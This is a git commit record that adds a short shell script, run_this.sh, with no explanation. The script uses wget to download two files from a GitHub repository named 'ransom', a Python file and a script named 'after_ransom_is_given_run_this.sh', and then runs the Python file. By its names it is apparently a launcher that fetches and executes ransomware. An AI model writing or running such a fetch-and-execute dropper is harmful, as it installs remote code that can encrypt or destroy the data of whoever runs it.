9e234e393c2caf208a6a7c95d2b30c43f2c5e58a
samsepi0lw <samsepi0lw@proton.me>
2023-10-05 11:14:58 +0000

    Create run_this.sh

---
+++ run_this.sh
@@ -0,0 +1,4 @@
+wget https://github.com/samsepi0lw/ransom/blob/main/monsterwith23faces.py?raw=true
+wget https://github.com/samsepi0lw/ransom/blob/main/after_ransom_is_given_run_this.sh?raw=true
+#!/bin/bash
+python monsterwith23faces.py\?raw=true
